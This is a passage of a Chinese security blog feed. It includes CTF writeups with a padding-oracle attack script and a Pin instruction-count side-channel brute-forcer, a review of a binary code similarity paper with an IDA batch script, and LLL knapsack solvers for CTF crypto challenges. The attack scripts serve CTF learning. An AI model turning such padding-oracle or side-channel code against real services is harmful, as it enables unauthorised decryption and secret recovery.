hex):'</span>)</span><br><span class="line">io.writeline(result.encode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Challege 6</span></span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.writeline(<span class="string">'6'</span>)</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline().strip().split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">iv = long_to_bytes(int(line[:<span class="number">32</span>],<span class="number">16</span>))</span><br><span class="line">se_c = long_to_bytes(int(line[<span class="number">32</span>:],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">tmp_iv = map(ord,list(iv))</span><br><span class="line">tmp_c = map(ord,list(se_c[:<span class="number">16</span>]))</span><br><span class="line">zero = <span class="string">'0'</span>*<span class="number">16</span></span><br><span class="line"></span><br><span class="line">ans = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">        io.writeline(<span class="string">'1'</span>)</span><br><span class="line">        io.read_until(<span class="string">'iv+c (encode hex):'</span>)</span><br><span class="line">        tmp_iv[-(<span class="number">1</span>+idx)] = num</span><br><span class="line">        payload = zero + <span class="string">''</span>.join(map(chr, tmp_iv+tmp_c))</span><br><span class="line">        payload = <span class="string">''</span>.join([<span class="string">'%02x'</span> % ord(ch) <span class="keyword">for</span> ch <span class="keyword">in</span> payload])</span><br><span class="line">        io.writeline(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'error'</span> <span class="keyword">not</span> <span class="keyword">in</span> io.readline():</span><br><span class="line">            ans[-(<span class="number">1</span>+idx)] = num ^ (idx+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(idx+<span class="number">1</span>):</span><br><span class="line">                tmp_iv[-(j+<span class="number">1</span>)] = ans[-(<span class="number">1</span>+j)] ^ (idx+<span class="number">2</span>)</span><br><span class="line">            print(ans)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"unknow error"</span>)</span><br><span class="line">ans = <span class="string">''</span>.join([<span class="string">'%02x'</span> % (ch^<span class="number">0x31</span>) <span class="keyword">for</span> ch <span class="keyword">in</span> ans])</span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.writeline(<span class="string">'2'</span>)</span><br><span class="line">io.read_until(<span class="string">'ecret(encode hex):'</span>)</span><br><span class="line">io.writeline(ans)</span><br><span class="line">io.interact()</span><br><span class="line"><span class="comment"># 974c3485c74af5a38c874d3c9d03b2c3</span></span><br></pre></td></tr></table></figure><h2><span id="pxx-warmup-obf">xx_warmup_obf</span><a href="#pxx-warmup-obf" class="header-anchor">#</a></h2><p>应该是被我非预期了23333。</p><p>一道混淆的re，但我向来是一个不喜欢麻烦的人，所以我抱着侥幸的心理试了下pin的指令数目侧信道，前置知识可以看之前这篇博客(<a href="https://blog.ycdxsb.cn/c61763eb.html">https://blog.ycdxsb.cn/c61763eb.html</a>)</p><p>可以看到有<code>bad passcode</code>,<code>you got it</code>和<code>you failed it</code>三个不同的字符串</p><p>根据位置和经验猜测第一个<code>bad passcode</code>是判断输入长度的，所以试了下知道输入长度为28字节</p><p>然后试了下第一个字节，发现<code>f</code>是指令数最少的，又简单测试了一下第二个<code>l</code>也满足条件，所以直接侧信道走起，吃个饭回来拿flag岂不是美滋滋，可惜题目看的太迟了，第4个做出来，连3血都没拿到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runCmd</span><span class="params">(self, cmd)</span>:</span></span><br><span class="line">        res = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdin=subprocess.PIPE,</span><br><span class="line">                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line">        sout, serr = res.communicate()</span><br><span class="line">        <span class="keyword">return</span> res.returncode, sout, serr, res.pid</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initPin</span><span class="params">(self, cmd)</span>:</span></span><br><span class="line">        res = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdin=subprocess.PIPE,</span><br><span class="line">                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line">        self.res = res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pinWrite</span><span class="params">(self, input)</span>:</span></span><br><span class="line">        self.res.stdin.write(input)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pinRun</span><span class="params">(self)</span>:</span></span><br><span class="line">        sout, serr = self.res.communicate()</span><br><span class="line">        <span class="keyword">return</span> sout, serr</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'./pin -t ./source/tools/ManualExamples/obj-intel64/inscount0.so -- ./xx_warmup_obf'</span></span><br><span class="line"></span><br><span class="line">shell = Shell()</span><br><span class="line"></span><br><span class="line">s = <span class="string">"f"</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">chs=string.printable</span><br><span class="line">chs = string.digits+string.ascii_letters+<span class="string">'&#123;&#125;_'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>):</span><br><span class="line">    min_num = <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">    min_ch = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> chs:</span><br><span class="line">        tmp = s + ch +(<span class="number">28</span>-len(s)<span class="number">-1</span>)*<span class="string">'a'</span>+<span class="string">'\n'</span></span><br><span class="line">        shell.initPin(cmd)</span><br><span class="line">        shell.pinWrite(tmp)</span><br><span class="line">        sout,serr = shell.pinRun()</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'inscount.out'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            count = f.readline().split(<span class="string">' '</span>)[<span class="number">1</span>]</span><br><span class="line">        count = int(count)</span><br><span class="line">        print(count,tmp,sout)</span><br><span class="line">        <span class="keyword">if</span>(count&lt;min_num):</span><br><span class="line">            min_num = count</span><br><span class="line">            min_ch = ch</span><br><span class="line">    s+=min_ch</span><br><span class="line">    print(min_num,min_ch)</span><br><span class="line">    print(<span class="string">'flag:'</span>+s)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Order Matters: Semantic-Aware Neural Networks for Binary Code Similarity Detection(AAAI 2020)</title>
    <url>/99505d2e.html</url>
    <content><![CDATA[<blockquote><p>​ 二进制代码相似性检测：在没有源代码的情况下检测相似的二进制函数。传统的方法一般使用图匹配算法进行检测，但传统方法准确率低且复杂度高。深度学习的发展为这一领域提供的新的方法，根据控制流图生成CFG，并使用GNN计算图嵌入，既高效又准确。本文提出Semantic-Aware Neural Networks ，取得了不错的成果</p></blockquote><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>​ 2017年有学者提出了Gemini网络（Gemini不是QG前主教练吗hhhh）</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-15-071054.png" alt="image-20200815151054450"></p><p>​ Gemini首先将CFG使用人工定义的特征，将CFG中的块表示为低维特征。然后使用Structure2vec生成图前嵌入。最后使用siamese计算两个二进制函数的相似度得分并使用梯度下降训练模型。</p><p>​ 但Gemini也有一些不足之处：1.它表示使用的向量只有8维，因此会损失很多语义信息；2.节点的顺序是很重要的一个信息，但它没有考虑。</p><p>​ 为了解决上面两个问题：本文使用了包含以下三个组件的框架：semantic-aware模块、structural-aware模块、order-aware模块。</p><p>​ 在semantic-aware模块中，使用NLP的方法对二进制函数的语义进行提取，将token看成word，block看成sentense。文中使用bert进行训练</p><p>​ 在structural-aware模块中，使用MPNN计算CFG的图信息</p><p>​ 在order-aware模块，主要是提取节点的顺序信息。如下图，是在不同平台编译的同一函数的CFG，可以看到它们的Node1都与Node2和Node3连接。Node2都与Node4和Node5连接。这个相似性可以从它们的邻接矩阵中很容易看到。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-15-072436.png" alt="image-20200815152436394"></p><p><strong>贡献</strong>：</p><ul><li>提出了能进行二进制相似性识别的框架</li><li>在semantic-aware模型中使用Bert进行预训练，并分割成MLM、ANP、BIG和GC四个子任务</li><li>在order-aware模型中，使用CNN检测邻接矩阵的相似性</li></ul><h2><span id="prelated-work">related work</span><a href="#prelated-work" class="header-anchor">#</a></h2><ul><li>Xu等人 Gemini 2017：使用图嵌入，效果好于传统方法，但手动选择特征进行块表示，包含的语义信息不足够</li><li>Zuo等人 2018：使用LSTM，将token看成word，block看成句子，使用LSTM进行语义表示，确保相同的块，语义表示也相同。缺点：1.训练数据太依赖专家经验；2.不同的平台需要进行单独训练和数据的收集</li></ul><h2><span id="pmodel">Model</span><a href="#pmodel" class="header-anchor">#</a></h2><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-15-073751.png" alt="image-20200815153750848"></p><p>总览：</p><pre><code>	可以看到上下两条路径。上面的路径输入时去掉了CFG的流信息，只使用块作为输入，在Semantic-aware模块中获得block embedding，然后通过Structual-aware模块获得graph embedding和structual embedding。在下面的路径中使用CFG的邻接矩阵作为输入，得到图的顺序信息，最后使用concat+MLP获得函数的表达。
</code></pre><p>$$G_{final} = MLP([G_{ss},G_o])$$</p><p>其中$G_{ss}$是上面得到的图嵌入信息，$G_o$是下面得到的图嵌入信息。</p><h3><span id="psemantic-aware-mo-kuai">Semantic-aware 模块</span><a href="#psemantic-aware-mo-kuai" class="header-anchor">#</a></h3><p>​ 在Bert预训练模型中，主要完成四个任务，这有很多好处：1.可以从不同架构、不同平台、不同优化选项下的CFG中得到block embedding；2.在预训练过程中，我们可以得到token、block、graph粒度下的信息（因为有token level、block level和两个graph level任务）；3.不需要需改编译器等来获得相似的块。</p><p>​ <img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-15-082312.png" alt="image-20200815162312068"></p><p>​ 从上图可以看到Bert预训练时要完成的4个任务。</p><ul><li>MLM是一个token-level的任务，对block中的token进行mask操作并进行预测</li><li>ANP任务是一个block-level的任务，控制流图是一个有向图，有节点的拓扑顺序，将控制流图中的所有相邻节点提取出来，当作相邻的“句子”。这些相邻的block pair作为ANP任务的正例，并随机选择同图内不相邻的block pair作为负例。</li><li>BIG是一个graph-level的任务，目的是让模型判断两个block是否在同一个图中。</li><li>GC是一个graph-level的block分类任务，在不同平台、不同编译器、不同优化选项的条件下，得到的block信息有所不同，因此希望模型可以让block embedding中包含这种信息。GC对block进行分类，判断block属于哪个平台，哪个编译器，以及哪个优化选项。</li></ul><h3><span id="pstructural-aware-mo-kuai">Structural-aware 模块</span><a href="#pstructural-aware-mo-kuai" class="header-anchor">#</a></h3><p>​ 在有了Bert的结果后，在这一模块中使用MPNN计算graph semantic和 structural embedding。MPNN包含三个步骤：message function M、update function U 、readout function R，经过T次后获得最终的graph embedding和structual embedding。</p><p>$$m_{v}^{t+1}=\sum_{w \in N(v)} M_{t}\left(h_{v}^{t}, h_{w}^{t}, e_{v w}\right)$$</p><p>$$h_{v}^{t+1}=U_{t} (h_{v}^{t}, m_{v}^{t+1} )$$</p><p>$$g_{s s}=R\left(h_{v}^{T} \mid v \in G\right)$$</p><p>​ 其中$G$指整个图、$v$代表节点、$N(v)$代表邻接节点、$h_v^t$代表$t$时刻的block embedding。在文中，$M_t$使用$MLP$、$U_t$使用$GRU$、$R$使用$MLP$。</p><h3><span id="porder-aware-mo-kuai">Order-aware 模块</span><a href="#porder-aware-mo-kuai" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-15-092129.png" alt="image-20200815172129019"></p><p>​ 在这一模块中使用CNN模型，主要是为了学习到CFG中的平移不变性（借鉴计算机视觉领域）</p><p>​ 在模型训练中，使用11层的Resnet结构，包含3个residual block，所有的feature map大小均为3*3。之后用一个global max pooling层，得到graph order embedding。在此之前不用pooling层，因为输入的图的大小不同</p><p>$$g_o = MaxPooling(ResNet(A))$$</p><h2><span id="pevalutaion">Evalutaion</span><a href="#pevalutaion" class="header-anchor">#</a></h2><p>实验主要检验方法的跨平台能力和跨优化选项能力。</p><p>Task1：跨平台二进制代码相似度分析</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-15-114609.png" alt="image-20200815194609605" style="zoom:50%"><p>Task2：判断优化选项的能力</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-15-114630.png" alt="image-20200815194630555" style="zoom:50%"><p>采用CNN确实能够学到控制流图中的节点顺序信息</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-15-114857.png" alt="image-20200815194856904"></p><h2><span id="pbinaryai-gong-ju-ce-shi">Binaryai工具测试</span><a href="#pbinaryai-gong-ju-ce-shi" class="header-anchor">#</a></h2><p>​ 科恩实验室在github以IDA 插件的形式开源了上面的工作。具体安装参考手册即可，注意需要$IDA \geq 7.3$。由于需要批量化测试效果，所以简单实现了批量测试的脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">'/usr/local/lib/python3.7/site-packages'</span>)</span><br><span class="line"><span class="keyword">import</span> binaryai <span class="keyword">as</span> bai</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">match_func</span><span class="params">(mgr, ea, topk, funcset_ids)</span>:</span></span><br><span class="line">    targets = <span class="literal">None</span></span><br><span class="line">    pfn = idaapi.get_func(ea)</span><br><span class="line">    <span class="keyword">if</span> idaapi.FlowChart(pfn).size &lt; mgr.cfg[<span class="string">'minsize'</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    targets = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        targets = mgr.retrieve_function(ea, topk=topk, funcset_ids=funcset_ids)</span><br><span class="line">        <span class="keyword">return</span> targets</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">match_all_funcs</span><span class="params">(funcs)</span>:</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    mgr = bai.ida_binaryai.BinaryAIManager()</span><br><span class="line">    mgr.cfg = mgr.Default</span><br><span class="line">    mgr.cfg[<span class="string">'token'</span>] = <span class="comment"># 填写自己申请的API token</span></span><br><span class="line">    funcset_ids = [mgr.funcset] <span class="keyword">if</span> <span class="keyword">not</span> mgr.cfg[<span class="string">'usepublic'</span>] <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> ea <span class="keyword">in</span> funcs:</span><br><span class="line">        targets = match_func(mgr, ea, <span class="number">1</span>, funcset_ids)</span><br><span class="line">        <span class="keyword">if</span>(targets == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        target = targets[<span class="number">0</span>]</span><br><span class="line">        result[ea] = target[<span class="string">'function'</span>][<span class="string">'name'</span>]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    idaapi.auto_wait()</span><br><span class="line">    funcs = []</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">        funcs.append(func)</span><br><span class="line">    print(funcs)</span><br><span class="line">    result = match_all_funcs(funcs)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'binary_match.pickle'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pickle.dump(result,f)</span><br><span class="line">    idaapi.qexit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>​ 测试结果是在这之前使用过的工具中结果最好的，具体表现在检出的数目最多，并且也保证了准确率，当设置阈值为默认0.9，选取top1结果时，测试的结果如下：</p><p><code>zlib 1.2.11 stripped</code></p><table><thead><tr><th style="text-align:center">编译器</th><th style="text-align:center">优化选项</th><th style="text-align:center">True</th><th style="text-align:center">Wrong</th><th style="text-align:center">结果数目/函数总数</th></tr></thead><tbody><tr><td style="text-align:center">Gcc</td><td style="text-align:center">O0</td><td style="text-align:center">112</td><td style="text-align:center">10</td><td style="text-align:center">122/218</td></tr><tr><td style="text-align:center">Gcc</td><td style="text-align:center">O1</td><td style="text-align:center">97</td><td style="text-align:center">13</td><td style="text-align:center">110/202</td></tr><tr><td style="text-align:center">Gcc</td><td style="text-align:center">O2</td><td style="text-align:center">94</td><td style="text-align:center">13</td><td style="text-align:center">107/196</td></tr><tr><td style="text-align:center">Gcc</td><td style="text-align:center">O3</td><td style="text-align:center">78</td><td style="text-align:center">20</td><td style="text-align:center">98/185</td></tr><tr><td style="text-align:center">Clang</td><td style="text-align:center">O0</td><td style="text-align:center">90</td><td style="text-align:center">35</td><td style="text-align:center">125/216</td></tr><tr><td style="text-align:center">Clang</td><td style="text-align:center">O1</td><td style="text-align:center">105</td><td style="text-align:center">14</td><td style="text-align:center">119/208</td></tr><tr><td style="text-align:center">Clang</td><td style="text-align:center">O2</td><td style="text-align:center">75</td><td style="text-align:center">27</td><td style="text-align:center">102/177</td></tr><tr><td style="text-align:center">Clang</td><td style="text-align:center">O3</td><td style="text-align:center">72</td><td style="text-align:center">29</td><td style="text-align:center">103/174</td></tr></tbody></table><p><code>libpng 1.0.69 stripped</code></p><table><thead><tr><th style="text-align:center">编译器</th><th style="text-align:center">优化选项</th><th style="text-align:center">True</th><th style="text-align:center">Wrong</th><th style="text-align:center">结果数目/函数总数</th></tr></thead><tbody><tr><td style="text-align:center">Gcc</td><td style="text-align:center">O0</td><td style="text-align:center">224</td><td style="text-align:center">64</td><td style="text-align:center">288/570</td></tr><tr><td style="text-align:center">Gcc</td><td style="text-align:center">O1</td><td style="text-align:center">210</td><td style="text-align:center">75</td><td style="text-align:center">285/568</td></tr><tr><td style="text-align:center">Gcc</td><td style="text-align:center">O2</td><td style="text-align:center">209</td><td style="text-align:center">74</td><td style="text-align:center">283/572</td></tr><tr><td style="text-align:center">Gcc</td><td style="text-align:center">O3</td><td style="text-align:center">203</td><td style="text-align:center">81</td><td style="text-align:center">284/572</td></tr><tr><td style="text-align:center">Clang</td><td style="text-align:center">O0</td><td style="text-align:center">198</td><td style="text-align:center">85</td><td style="text-align:center">283/568</td></tr><tr><td style="text-align:center">Clang</td><td style="text-align:center">O1</td><td style="text-align:center">195</td><td style="text-align:center">85</td><td style="text-align:center">280/568</td></tr><tr><td style="text-align:center">Clang</td><td style="text-align:center">O2</td><td style="text-align:center">170</td><td style="text-align:center">112</td><td style="text-align:center">282/541</td></tr><tr><td style="text-align:center">Clang</td><td style="text-align:center">O3</td><td style="text-align:center">170</td><td style="text-align:center">113</td><td style="text-align:center">283/540</td></tr></tbody></table><p>​ 但工具也存在不足之处，尤其是对于小函数，由于缺乏足够的CFG信息，因此会出现一些误报，这应该也是插件代码中过滤了块数目不足3的函数的原因(<code>idaapi.FlowChart(pfn).size &lt; mgr.cfg['minsize']</code>) 。</p><h2><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h2><ul><li><a href="https://link.zhihu.com/?target=https%3A//keenlab.tencent.com/en/whitepapers/Ordermatters.pdf">https://link.zhihu.com/?target=https%3A//keenlab.tencent.com/en/whitepapers/Ordermatters.pdf</a></li><li><a href="https://github.com/binaryai/sdk" target="_blank" rel="noopener">https://github.com/binaryai/sdk</a></li><li><a href="https://zhuanlan.zhihu.com/p/96547586" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/96547586</a></li></ul>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>automatic_analyse</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>automatic analyse</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.08.12 迪士尼的天很蓝，城堡很美</title>
    <url>/62acab4f.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 输入密码错误.请重新输入." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder>
    <label for="hbePass">请输入密码查看.若无反应.请使用firefox浏览器</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="7701778c0bf28155f312cae4efce2278042ef7e2fa3e19decdac4e9fa2ca8709">a21f83297447d6ab9da6f7f28fe551378ea7bcf93aaec43acf85d911df2ac98f0f46224360d665074768f25eb5e63e461da62eccd0c703f8b498fd15d8539657265a33f7e6c1a9a1d472d153d4d02fd52883461b44ce5f54b40504aa6e879755d167b8369f9535d5305d5df386d0c86d0f44128a434104f35f5c1e629eafb1805d6fb91a2ee7c79d7a2b2a7068864ecc991e04fca31836721334c3a4d64e96e1df76521b0079e58473db7ab7ba07ec417d8c292f5d70f835d0326efe0aa99531</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>Knapsack Problem</title>
    <url>/c65d2bd5.html</url>
    <content><![CDATA[<blockquote><p>最近经常碰到背包问题，所以稍微整理一下</p></blockquote><h2><span id="pwen-ti-miao-shu">问题描述</span><a href="#pwen-ti-miao-shu" class="header-anchor">#</a></h2><p>一般我们碰到的都是0 1背包问题，如下，我们已有数字$a_1,a_2…a_n$，从中给它们分别赋予0或者1的权重$w_i$，使得最终的和为$W$，即</p><p>$$\sum_1^n w_ia_i = W$$</p><p>而在这类问题中，当$n$较大时就是一个$2^n$复杂度的NP问题</p><a id="more"></a><h2><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h2><p>主要通过构造LLL格解决，目前的解法对Knapsack Problem的密度要求为$\frac{n}{log_2(max(pb))}&lt; 0.9408$，具体的格的方法有很多种，脚本内是其中的一种构造</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line"></span><br><span class="line">pk &#x3D;  # public key</span><br><span class="line">ct &#x3D;  # ciphertext</span><br><span class="line">print(ct)</span><br><span class="line">print(len(pk))</span><br><span class="line">n &#x3D; len(pk)</span><br><span class="line"></span><br><span class="line"># Sanity check for application of low density attack</span><br><span class="line">d &#x3D; n &#x2F; log(max(pk), 2)</span><br><span class="line">print(CDF(d))</span><br><span class="line">assert CDF(d) &lt; 0.9408</span><br><span class="line"></span><br><span class="line">M &#x3D; Matrix.identity(n) * 2</span><br><span class="line"></span><br><span class="line">last_row &#x3D; [1 for x in pk]</span><br><span class="line">M_last_row &#x3D; Matrix(ZZ, 1, len(last_row), last_row)</span><br><span class="line"></span><br><span class="line">last_col &#x3D; pk</span><br><span class="line">last_col.append(ct)</span><br><span class="line">M_last_col &#x3D; Matrix(ZZ, len(last_col), 1, last_col)</span><br><span class="line"></span><br><span class="line">M &#x3D; M.stack(M_last_row)</span><br><span class="line">M &#x3D; M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">X &#x3D; M.BKZ()</span><br><span class="line"></span><br><span class="line">sol &#x3D; []</span><br><span class="line">for i in range(n + 1):</span><br><span class="line">    testrow &#x3D; X.row(i).list()[:-1]</span><br><span class="line">    if set(testrow).issubset([-1, 1]):</span><br><span class="line">        for v in testrow:</span><br><span class="line">            if v &#x3D;&#x3D; 1:</span><br><span class="line">                sol.append(0)</span><br><span class="line">            elif v &#x3D;&#x3D; -1:</span><br><span class="line">                sol.append(1)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">s &#x3D; sol</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><h2><span id="p2020-tian-yi-bei-alicehomework">2020 天翼杯 alicehomework</span><a href="#p2020-tian-yi-bei-alicehomework" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import random</span><br><span class="line">import gmpy2</span><br><span class="line">from secret import flag</span><br><span class="line"></span><br><span class="line">def generateKey(bitlen):</span><br><span class="line">    u &#x3D; 2</span><br><span class="line">    v &#x3D; 200</span><br><span class="line">    seed &#x3D; random.randint(3**bitlen,4**bitlen)</span><br><span class="line">    sequence &#x3D; [seed]</span><br><span class="line">    s &#x3D; seed</span><br><span class="line">    for i in range(1,bitlen):</span><br><span class="line">        seed &#x3D; random.randint(s + v, u*(s+v))</span><br><span class="line">        sequence.append(seed)</span><br><span class="line">        s +&#x3D; seed</span><br><span class="line">    q &#x3D; random.randint(s+v, u*(s+v))</span><br><span class="line">    r &#x3D; random.randint(1, q)</span><br><span class="line">    while gmpy2.gcd(r, q) !&#x3D; 1:</span><br><span class="line">        r &#x3D; random.randint(1, q)</span><br><span class="line">    key &#x3D; [ r*w % q for w in sequence]</span><br><span class="line">    return key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(msg, pubKey):</span><br><span class="line">	msg_bit &#x3D; msg</span><br><span class="line">	n &#x3D; len(pubKey)</span><br><span class="line">	cipher &#x3D; 0</span><br><span class="line">	i &#x3D; 0</span><br><span class="line">	for bit in msg_bit:</span><br><span class="line">		cipher +&#x3D; int(bit)*pubKey[i]</span><br><span class="line">		i +&#x3D; 1</span><br><span class="line">	return bin(cipher)[2:]</span><br><span class="line"></span><br><span class="line">msg &#x3D; bin(bytes_to_long(flag))[2:]</span><br><span class="line">key &#x3D; generateKey(len(msg))</span><br><span class="line">enc &#x3D;  encrypt(msg, key)</span><br><span class="line">print key</span><br><span class="line">print int(enc, 2)</span><br></pre></td></tr></table></figure><p>从加密的函数看就是01背包问题了，并且给出了公钥和最后的密文，直接带入脚本求出二进制bit，然后通过简单运算可以得到结果</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">pk &#x3D; </span><br><span class="line">ct &#x3D; </span><br><span class="line">n &#x3D; len(pk)</span><br><span class="line"></span><br><span class="line"># Sanity check for application of low density attack</span><br><span class="line">d &#x3D; n &#x2F; log(max(pk), 2)</span><br><span class="line">print(CDF(d))</span><br><span class="line">assert CDF(d) &lt; 0.9408</span><br><span class="line"></span><br><span class="line">M &#x3D; Matrix.identity(n) * 2</span><br><span class="line"></span><br><span class="line">last_row &#x3D; [1 for x in pk]</span><br><span class="line">M_last_row &#x3D; Matrix(ZZ, 1, len(last_row), last_row)</span><br><span class="line"></span><br><span class="line">last_col &#x3D; pk</span><br><span class="line">last_col.append(ct)</span><br><span class="line">M_last_col &#x3D; Matrix(ZZ, len(last_col), 1, last_col)</span><br><span class="line"></span><br><span class="line">M &#x3D; M.stack(M_last_row)</span><br><span class="line">M &#x3D; M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">X &#x3D; M.BKZ()</span><br><span class="line"></span><br><span class="line">sol &#x3D; []</span><br><span class="line">for i in range(n + 1):</span><br><span class="line">    testrow &#x3D; X.row(i).list()[:-1]</span><br><span class="line">    print(testrow)</span><br><span class="line">    if set(testrow).issubset([-1, 1]):</span><br><span class="line">        for v in testrow:</span><br><span class="line">            if v &#x3D;&#x3D; 1:</span><br><span class="line">                sol.append(0)</span><br><span class="line">            elif v &#x3D;&#x3D; -1:</span><br><span class="line">                sol.append(1)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">s &#x3D; sol</span><br><span class="line">print(s)</span><br><span class="line">result &#x3D; [pow(2,len(s)-1-i)*s[i] for i in range(len(s))]</span><br><span class="line">print(long_to_bytes(sum(result)))</span><br><span class="line"># flag&#123;8130e8c14fe4df06558c0a7ebf06f272&#125;</span><br></pre></td></tr></table></figure><h2><span id="p2020-wmctf-babysum">2020 WMCTF babysum</span><a href="#p2020-wmctf-babysum" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># task.py</span><br><span class="line">from json import dump</span><br><span class="line">from random import SystemRandom</span><br><span class="line"></span><br><span class="line">random &#x3D; SystemRandom()</span><br><span class="line"></span><br><span class="line">k, n, d &#x3D; 20, 120, 0.8</span><br><span class="line"></span><br><span class="line">B &#x3D; 2**(n&#x2F;d)</span><br><span class="line">A &#x3D; [random.randint(1, B) for _ in 